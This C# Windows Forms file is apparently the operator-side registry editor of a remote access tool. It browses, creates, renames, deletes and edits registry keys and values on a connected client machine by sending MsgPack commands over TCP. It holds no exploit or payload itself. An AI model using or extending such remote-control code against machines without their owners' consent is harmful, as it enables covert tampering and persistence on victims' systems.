using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;
using Server.Connection;
using Server.Helper;
using Server.MessagePack;
using static Server.Helper.RegistrySeeker;

namespace Server.Forms
{
    public partial class FormRegistryEditor : Form
    {
        public Form1 F { get; set; }
        internal Clients Client { get; set; }
        internal Clients ParentClient { get; set; }




        public FormRegistryEditor()
        {
            InitializeComponent();
        }

        private void FrmRegistryEditor_Load(object sender, EventArgs e)
        {
            if (ParentClient.Admin != true)
            {
                MessageBox.Show(
                    "The client software is not running as administrator and therefore some functionality like Update, Create, Open and Delete may not work properly!",
                    "Alert!", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            }
        }

        private void AddRootKey(RegSeekerMatch match)
        {
            TreeNode node = CreateNode(match.Key, match.Key, match.Data);
            node.Nodes.Add(new TreeNode());
            tvRegistryDirectory.Nodes.Add(node);
        }

        private TreeNode AddKeyToTree(TreeNode parent, RegSeekerMatch subKey)
        {
            TreeNode node = CreateNode(subKey.Key, subKey.Key, subKey.Data);
            parent.Nodes.Add(node);
            if (subKey.HasSubKeys)
                node.Nodes.Add(new TreeNode());
            return node;
        }

        private TreeNode CreateNode(string key, string text, object tag)
        {
            return new TreeNode()
            {
                Text = text,
                Name = key,
                Tag = tag
            };
        }

        public void AddKeys(string rootKey, RegSeekerMatch[] matches)
        {
            if (string.IsNullOrEmpty(rootKey))
            {
                tvRegistryDirectory.BeginUpdate();

                foreach (var match in matches)
                    AddRootKey(match);

                tvRegistryDirectory.SelectedNode = tvRegistryDirectory.Nodes[0];

                tvRegistryDirectory.EndUpdate();
            }
            else
            {
                TreeNode parent = GetTreeNode(rootKey);

                if (parent != null)
                {
                    tvRegistryDirectory.BeginUpdate();

                    foreach (var match in matches)
                        AddKeyToTree(parent, match);

                    parent.Expand();
                    tvRegistryDirectory.EndUpdate();
                }
            }
        }

        public void CreateNewKey(string rootKey, RegSeekerMatch match)
        {
            TreeNode parent = GetTreeNode(rootKey);

            TreeNode node = AddKeyToTree(parent, match);

            node.EnsureVisible();

            tvRegistryDirectory.SelectedNode = node;
            node.Expand();
            tvRegistryDirectory.LabelEdit = true;
            node.BeginEdit();
        }

        public void DeleteKey(string rootKey, string subKey)
        {
            TreeNode parent = GetTreeNode(rootKey);

            if (parent.Nodes.ContainsKey(subKey)) {
                parent.Nodes.RemoveByKey(subKey);
            }
        }

        public void RenameKey(string rootKey, string oldName, string newName)
        {
            TreeNode parent = GetTreeNode(rootKey);

            if (parent.Nodes.ContainsKey(oldName))
            {
                parent.Nodes[oldName].Text = newName;
                parent.Nodes[oldName].Name = newName;

                tvRegistryDirectory.SelectedNode = parent.Nodes[newName];
            }
        }

        /// <summary>
        /// Tries to find the desired TreeNode given the full path to it.
        /// </summary>
        /// <param name="path">The full path to the TreeNode.</param>
        /// <returns>Null if an invalid name is passed or the TreeNode could not be found; The TreeNode represented by the full path.</returns>
        private TreeNode GetTreeNode(string path)
        {
            string[] nodePath = path.Split(new char[] { '\\' });

            TreeNode lastNode = tvRegistryDirectory.Nodes[nodePath[0]];
            if (lastNode == null)
                return null;

            for (int i = 1; i < nodePath.Length; i++)
            {
                lastNode = lastNode.Nodes[nodePath[i]];
                if (lastNode == null)
                    return null;
            }
            return lastNode;
        }


        #region ListView helper functions

        public void CreateValue(string keyPath, RegValueData value)
        {
            TreeNode key = GetTreeNode(keyPath);

            if (key != null )
            {
                List<RegValueData> valuesFromNode = ((RegValueData[])key.Tag).ToList();
                valuesFromNode.Add(value);
                key.Tag = valuesFromNode.ToArray();

                if (tvRegistryDirectory.SelectedNode == key)
                {
                    RegistryValueLstItem item = new RegistryValueLstItem(value);
                    lstRegistryValues.Items.Add(item);
                    //Unselect all
                    lstRegistryValues.SelectedIndices.Clear();
                    item.Selected = true;
                    lstRegistryValues.LabelEdit = true;
                    item.BeginEdit();
                }

                tvRegistryDirectory.SelectedNode = key;
            }
        }

        public void DeleteValue(string keyPath, string valueName)
        {
            TreeNode key = GetTreeNode(keyPath);

            if (key != null)
            {
                if (!RegValueHelper.IsDefaultValue(valueName))
                {
                    //Remove the values that have the specified name
                    key.Tag = ((RegValueData[])key.Tag).Where(value => value.Name != valueName).ToArray();

                    if (tvRegistryDirectory.SelectedNode == key)
                        lstRegistryValues.Items.RemoveByKey(valueName);
                }
                else //Handle delete of default value
                {
                    var regValue = ((RegValueData[])key.Tag).First(item => item.Name == valueName);

                    if(tvRegistryDirectory.SelectedNode == key)
                    {
                        var valueItem = lstRegistryValues.Items.Cast<RegistryValueLstItem>()
                                                     .SingleOrDefault(item => item.Name == valueName);
                        if (valueItem != null)
                            valueItem.Data = regValue.Kind.RegistryTypeToString(null);
                    }
                }

                tvRegistryDirectory.SelectedNode = key;
            }
        }

        public void RenameValue(string keyPath, string oldName, string newName)
        {
            TreeNode key = GetTreeNode(keyPath);

            if (key != null)
            {
                var value = ((RegValueData[])key.Tag).First(item => item.Name == oldName);
                value.Name = newName;

                if (tvRegistryDirectory.SelectedNode == key)
                {
                    var valueItem = lstRegistryValues.Items.Cast<RegistryValueLstItem>()
                                                     .SingleOrDefault(item => item.Name == oldName);              
                    if (valueItem != null)
                        valueItem.RegName = newName;
                }

                tvRegistryDirectory.SelectedNode = key;
            }
        }

        public void ChangeValue(string keyPath, RegValueData value)
        {
            TreeNode key = GetTreeNode(keyPath);

            if (key != null)
            {
                var regValue = ((RegValueData[])key.Tag).First(item => item.Name == value.Name);
                ChangeRegistryValue(value, regValue);

                if (tvRegistryDirectory.SelectedNode == key)
                {
                    var valueItem = lstRegistryValues.Items.Cast<RegistryValueLstItem>()
                                                     .SingleOrDefault(item => item.Name == value.Name);
                    if (valueItem != null)
                        valueItem.Data = RegValueHelper.RegistryValueToString(value);
                }

                tvRegistryDirectory.SelectedNode = key;
            }
        }

        private void ChangeRegistryValue(RegValueData source, RegValueData dest)
        {
            if (source.Kind != dest.Kind) return;
            dest.Data = source.Data;
        }

        private void UpdateLstRegistryValues(TreeNode node)
        {
            selectedStripStatusLabel.Text = node.FullPath;

            RegValueData[] ValuesFromNode = (RegValueData[])node.Tag;

            PopulateLstRegistryValues(ValuesFromNode);
        }

        private void PopulateLstRegistryValues(RegValueData[] values)
        {
            lstRegistryValues.BeginUpdate();
            lstRegistryValues.Items.Clear();

            //Sort values
            values = (
                from value in values
                orderby value.Name ascending
                select value
                ).ToArray();

            foreach (var value in values)
            {
                RegistryValueLstItem item = new RegistryValueLstItem(value);
                lstRegistryValues.Items.Add(item);
            }

            lstRegistryValues.EndUpdate();
        }

        #endregion

        #region tvRegistryDirectory actions

        private void tvRegistryDirectory_AfterLabelEdit(object sender, NodeLabelEditEventArgs e)
        {
            if (e.Label != null)
            {
                e.CancelEdit = true;

                if (e.Label.Length > 0)
                {
                    if (e.Node.Parent.Nodes.ContainsKey(e.Label))
                    {
                        MessageBox.Show("Invalid label. \nA node with that label already exists.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                        e.Node.BeginEdit();
                    }
                    else
                    {
                        MsgPack msgpack = new MsgPack();
                        msgpack.ForcePathObject("Pac_ket").AsString = "regManager";
                        msgpack.ForcePathObject("Command").AsString = "RenameRegistryKey";
                        msgpack.ForcePathObject("OldKeyName").AsString = e.Node.Name;
                        msgpack.ForcePathObject("NewKeyName").AsString = e.Label;
                        msgpack.ForcePathObject("ParentPath").AsString = e.Node.Parent.FullPath;
                        ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                        tvRegistryDirectory.LabelEdit = false;
                    }
                }
                else
                {
                    MessageBox.Show("Invalid label. \nThe label cannot be blank.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    e.Node.BeginEdit();
                }
            }
            else
            {
                //Stop editing if no changes where made
                tvRegistryDirectory.LabelEdit = false;
            }
        }

        private void tvRegistryDirectory_BeforeExpand(object sender, TreeViewCancelEventArgs e)
        {
            TreeNode parentNode = e.Node;

            // If nothing is there (yet).
            if (string.IsNullOrEmpty(parentNode.FirstNode.Name))
            {
                tvRegistryDirectory.SuspendLayout();
                parentNode.Nodes.Clear();


                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "regManager";
                msgpack.ForcePathObject("Command").AsString = "LoadRegistryKey";
                msgpack.ForcePathObject("RootKeyName").AsString = parentNode.FullPath;
                ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());

                Thread.Sleep(500);
                tvRegistryDirectory.ResumeLayout();

                e.Cancel = true;
            }
        }

        private void tvRegistryDirectory_NodeMouseClick(object sender, TreeNodeMouseClickEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {
                //Bug fix with rightclick not working for selectednode
                tvRegistryDirectory.SelectedNode = e.Node;

                //Display the context menu
                Point pos = new Point(e.X, e.Y);
                CreateTreeViewMenuStrip();
                tv_ContextMenuStrip.Show(tvRegistryDirectory, pos);
            }
        }

        private void tvRegistryDirectory_BeforeSelect(object sender, TreeViewCancelEventArgs e)
        {
            UpdateLstRegistryValues(e.Node);
        }

        private void tvRegistryDirectory_KeyUp(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Delete && GetDeleteState())
                deleteRegistryKey_Click(this, e);
        }

        #endregion

        #region ToolStrip and contextmenu helper functions

        private void CreateEditToolStrip()
        {
            this.modifyToolStripMenuItem1.Visible =
                this.modifyBinaryDataToolStripMenuItem1.Visible =
                    this.modifyNewtoolStripSeparator.Visible = lstRegistryValues.Focused;

            this.modifyToolStripMenuItem1.Enabled =
                this.modifyBinaryDataToolStripMenuItem1.Enabled = lstRegistryValues.SelectedItems.Count == 1;

            this.renameToolStripMenuItem2.Enabled = GetRenameState();
            this.deleteToolStripMenuItem2.Enabled = GetDeleteState();
        }

        private void  CreateTreeViewMenuStrip()
        {
            this.renameToolStripMenuItem.Enabled = tvRegistryDirectory.SelectedNode.Parent != null;

            this.deleteToolStripMenuItem.Enabled = tvRegistryDirectory.SelectedNode.Parent != null;
        }

        private void CreateListViewMenuStrip()
        {
            this.modifyToolStripMenuItem.Enabled =
                this.modifyBinaryDataToolStripMenuItem.Enabled = lstRegistryValues.SelectedItems.Count == 1;

            this.renameToolStripMenuItem1.Enabled = lstRegistryValues.SelectedItems.Count == 1 && !RegValueHelper.IsDefaultValue(lstRegistryValues.SelectedItems[0].Name);

            this.deleteToolStripMenuItem1.Enabled = tvRegistryDirectory.SelectedNode != null && lstRegistryValues.SelectedItems.Count > 0;
        }

        #endregion

        #region MenuStrip actions

        private void editToolStripMenuItem_DropDownOpening(object sender, EventArgs e)
        {
            CreateEditToolStrip();
        }

        private void menuStripExit_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void menuStripDelete_Click(object sender, EventArgs e) {
            if(tvRegistryDirectory.Focused)
            {
                deleteRegistryKey_Click(this, e);
            }
            else if (lstRegistryValues.Focused) 
            {
                deleteRegistryValue_Click(this, e);
            }
        }

        private void menuStripRename_Click(object sender, EventArgs e)
        {
            if (tvRegistryDirectory.Focused)
            {
                renameRegistryKey_Click(this, e);
            }
            else if (lstRegistryValues.Focused)
            {
                renameRegistryValue_Click(this, e);
            }
        }

        #endregion

        #region lstRegistryKeys actions

        private void lstRegistryKeys_MouseClick(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {
                Point pos = new Point(e.X, e.Y);

                //Try to check if a item was clicked
                if (lstRegistryValues.GetItemAt(pos.X, pos.Y) == null)
                {
                    //Not on a item
                    lst_ContextMenuStrip.Show(lstRegistryValues, pos);
                }
                else
                {
                    //Clicked on a item
                    CreateListViewMenuStrip();
                    selectedItem_ContextMenuStrip.Show(lstRegistryValues, pos);
                }
            }
        }

        private void lstRegistryKeys_AfterLabelEdit(object sender, LabelEditEventArgs e)
        {
            if (e.Label != null && tvRegistryDirectory.SelectedNode != null)
            {
                e.CancelEdit = true;
                int index = e.Item;

                if (e.Label.Length > 0)
                {
                    if (lstRegistryValues.Items.ContainsKey(e.Label))
                    {
                        MessageBox.Show("Invalid label. \nA node with that label already exists.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                        lstRegistryValues.Items[index].BeginEdit();
                        return;
                    }

                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "regManager";
                    msgpack.ForcePathObject("Command").AsString = "RenameRegistryValue";
                    msgpack.ForcePathObject("OldValueName").AsString = lstRegistryValues.Items[index].Name;
                    msgpack.ForcePathObject("NewValueName").AsString = e.Label;
                    msgpack.ForcePathObject("KeyPath").AsString = tvRegistryDirectory.SelectedNode.FullPath;
                    ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                    lstRegistryValues.LabelEdit = false;
                }
                else
                {
                    MessageBox.Show("Invalid label. \nThe label cannot be blank.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    lstRegistryValues.Items[index].BeginEdit();

                }
            }
            else
            {
                lstRegistryValues.LabelEdit = false;
            }
        }

        private void lstRegistryKeys_KeyUp(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Delete && GetDeleteState())
                deleteRegistryValue_Click(this, e);
        }

        #endregion

        #region ContextMenu

        private void createNewRegistryKey_Click(object sender, EventArgs e)
        {
            if (!(tvRegistryDirectory.SelectedNode.IsExpanded) && tvRegistryDirectory.SelectedNode.Nodes.Count > 0)
            {
                //Subscribe (wait for node to expand)
                tvRegistryDirectory.AfterExpand += this.createRegistryKey_AfterExpand;
                tvRegistryDirectory.SelectedNode.Expand();
            }
            else
            {
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "regManager";
                msgpack.ForcePathObject("Command").AsString = "CreateRegistryKey";
                msgpack.ForcePathObject("ParentPath").AsString = tvRegistryDirectory.SelectedNode.FullPath;
                ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
            }
        }

        private void deleteRegistryKey_Click(object sender, EventArgs e)
        {
            // prompt user to confirm delete
            string msg = "Are you sure you want to permanently delete this key and all of its subkeys?";
            string caption = "Confirm Key Delete";
            var answer = MessageBox.Show(msg, caption, MessageBoxButtons.YesNo, MessageBoxIcon.Warning);

            if (answer == DialogResult.Yes)
            {
                string parentPath = tvRegistryDirectory.SelectedNode.Parent.FullPath;

                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "regManager";
                msgpack.ForcePathObject("Command").AsString = "DeleteRegistryKey";
                msgpack.ForcePathObject("KeyName").AsString = tvRegistryDirectory.SelectedNode.Name;
                msgpack.ForcePathObject("ParentPath").AsString = parentPath;
                ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
            }
        }

        private void renameRegistryKey_Click(object sender, EventArgs e)
        {
            tvRegistryDirectory.LabelEdit = true;
            tvRegistryDirectory.SelectedNode.BeginEdit();
        }

        #region New registry value actions

        private void createStringRegistryValue_Click(object sender, EventArgs e)
        {
            if (tvRegistryDirectory.SelectedNode != null)
            {
                // request the creation of a new Registry value of type REG_SZ
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "regManager";
                msgpack.ForcePathObject("Command").AsString = "CreateRegistryValue";
                msgpack.ForcePathObject("KeyPath").AsString = tvRegistryDirectory.SelectedNode.FullPath;
                msgpack.ForcePathObject("Kindstring").AsString = "1";//RegistryValueKind.String
                ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
            }
        }

        private void createBinaryRegistryValue_Click(object sender, EventArgs e)
        {
            if (tvRegistryDirectory.SelectedNode != null)
            {
                // request the creation of a new Registry value of type REG_BINARY
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "regManager";
                msgpack.ForcePathObject("Command").AsString = "CreateRegistryValue";
                msgpack.ForcePathObject("KeyPath").AsString = tvRegistryDirectory.SelectedNode.FullPath;
                msgpack.ForcePathObject("Kindstring").AsString = "3";//RegistryValueKind.Binary
                ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
            }
        }

        private void createDwordRegistryValue_Click(object sender, EventArgs e)
        {
            if (tvRegistryDirectory.SelectedNode != null)
            {
                // request the creation of a new Registry value of type REG_DWORD
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "regManager";
                msgpack.ForcePathObject("Command").AsString = "CreateRegistryValue";
                msgpack.ForcePathObject("KeyPath").AsString = tvRegistryDirectory.SelectedNode.FullPath;
                msgpack.ForcePathObject("Kindstring").AsString = "4";//RegistryValueKind.DWord
                ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
            }
        }

        private void createQwordRegistryValue_Click(object sender, EventArgs e)
        {
            if (tvRegistryDirectory.SelectedNode != null)
            {
                // request the creation of a new Registry value of type REG_QWORD
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "regManager";
                msgpack.ForcePathObject("Command").AsString = "CreateRegistryValue";
                msgpack.ForcePathObject("KeyPath").AsString = tvRegistryDirectory.SelectedNode.FullPath;
                msgpack.ForcePathObject("Kindstring").AsString = "11";//RegistryValueKind.QWord
                ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
            }
        }

        private void createMultiStringRegistryValue_Click(object sender, EventArgs e)
        {
            if (tvRegistryDirectory.SelectedNode != null)
            {
                // request the creation of a new Registry value of type REG_MULTI_SZ
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "regManager";
                msgpack.ForcePathObject("Command").AsString = "CreateRegistryValue";
                msgpack.ForcePathObject("KeyPath").AsString = tvRegistryDirectory.SelectedNode.FullPath;
                msgpack.ForcePathObject("Kindstring").AsString = "7";//RegistryValueKind.MultiString
                ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
            }
        }

        private void createExpandStringRegistryValue_Click(object sender, EventArgs e)
        {
            if (tvRegistryDirectory.SelectedNode != null)
            {
                // request the creation of a new Registry value of type REG_EXPAND_SZ
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "regManager";
                msgpack.ForcePathObject("Command").AsString = "CreateRegistryValue";
                msgpack.ForcePathObject("KeyPath").AsString = tvRegistryDirectory.SelectedNode.FullPath;
                msgpack.ForcePathObject("Kindstring").AsString = "2";//RegistryValueKind.ExpandString
                ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
            }
        }

        #endregion

        #region Registry value edit actions

        private void deleteRegistryValue_Click(object sender, EventArgs e)
        {
            //Prompt user to confirm delete
            string msg = "Deleting certain registry values could cause system instability. Are you sure you want to permanently delete " + (lstRegistryValues.SelectedItems.Count == 1 ? "this value?": "these values?");
            string caption = "Confirm Value Delete";
            var answer = MessageBox.Show(msg, caption, MessageBoxButtons.YesNo, MessageBoxIcon.Warning);

            if (answer == DialogResult.Yes)
            {
                foreach (var item in lstRegistryValues.SelectedItems)
                {
                    if (item.GetType() == typeof(RegistryValueLstItem))
                    {
                        RegistryValueLstItem registryValue = (RegistryValueLstItem) item;
                        MsgPack msgpack = new MsgPack();
                        msgpack.ForcePathObject("Pac_ket").AsString = "regManager";
                        msgpack.ForcePathObject("Command").AsString = "DeleteRegistryValue";
                        msgpack.ForcePathObject("KeyPath").AsString = tvRegistryDirectory.SelectedNode.FullPath;
                        msgpack.ForcePathObject("ValueName").AsString = registryValue.RegName;
                        ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                    }
                }
            }
        }

        private void renameRegistryValue_Click(object sender, EventArgs e)
        {
		    lstRegistryValues.LabelEdit = true;
		    lstRegistryValues.SelectedItems[0].BeginEdit();
        }

        private void modifyRegistryValue_Click(object sender, EventArgs e)
        {
            CreateEditForm(false);
        }

        private void modifyBinaryDataRegistryValue_Click(object sender, EventArgs e)
        {
            CreateEditForm(true);
        }

        #endregion

        #endregion

        private void createRegistryKey_AfterExpand(object sender, TreeViewEventArgs e)
        {
            if (e.Node == tvRegistryDirectory.SelectedNode)
            {
                createNewRegistryKey_Click(this, e);

                tvRegistryDirectory.AfterExpand -= createRegistryKey_AfterExpand;
            }
        }

        #region helper functions

        private bool GetDeleteState()
        {
            if (lstRegistryValues.Focused)
                return lstRegistryValues.SelectedItems.Count > 0;
            else if (tvRegistryDirectory.Focused && tvRegistryDirectory.SelectedNode != null)
                return tvRegistryDirectory.SelectedNode.Parent != null;
            return false;
        }

        private bool GetRenameState()
        {
            if (lstRegistryValues.Focused)
                return lstRegistryValues.SelectedItems.Count == 1 && !RegValueHelper.IsDefaultValue(lstRegistryValues.SelectedItems[0].Name);
            else if (tvRegistryDirectory.Focused && tvRegistryDirectory.SelectedNode != null)
                return tvRegistryDirectory.SelectedNode.Parent != null;
            return false;
        }

        private Form GetEditForm(RegValueData value, RegistryValueKind valueKind)
        {
            switch (valueKind)
            {
                case RegistryValueKind.String:
                case RegistryValueKind.ExpandString:
                    return new FormRegValueEditString(value);
                case RegistryValueKind.DWord:
                case RegistryValueKind.QWord:
                    return new FormRegValueEditWord(value);
                case RegistryValueKind.MultiString:
                    return new FormRegValueEditMultiString(value);
                case RegistryValueKind.Binary:
                    return new FormRegValueEditBinary(value);
                default:
                    return null;
            }
        }

        private void CreateEditForm(bool isBinary)
        {
            string keyPath = tvRegistryDirectory.SelectedNode.FullPath;
            string name = lstRegistryValues.SelectedItems[0].Name;
            RegValueData value = ((RegValueData[])tvRegistryDirectory.SelectedNode.Tag).ToList().Find(item => item.Name == name);

            // any kind can be edited as binary
            RegistryValueKind kind = isBinary ? RegistryValueKind.Binary : value.Kind;

            using (var frm = GetEditForm(value, kind))
            {
                if (frm.ShowDialog() == DialogResult.OK)
                {
                    //ChangeRegistryValue(keyPath, (RegValueData) frm.Tag);
                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "regManager";
                    msgpack.ForcePathObject("Command").AsString = "ChangeRegistryValue";
                    //msgpack.ForcePathObject("KeyPath").AsString = tvRegistryDirectory.SelectedNode.FullPath;
                    //msgpack.ForcePathObject("Kindstring").AsString = "11";
                    ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                }
            }
        }

        #endregion

        public void timer1_Tick(object sender, EventArgs e)
        {
            try
            {
                if (!ParentClient.TcpClient.Connected || !Client.TcpClient.Connected) this.Close();
            }
            catch { this.Close(); }
        }

        private void FormRegistryEditor_FormClosed(object sender, FormClosedEventArgs e)
        {
            ThreadPool.QueueUserWorkItem((o) =>
            {
                Client?.Disconnected();
            });
        }
    }
}
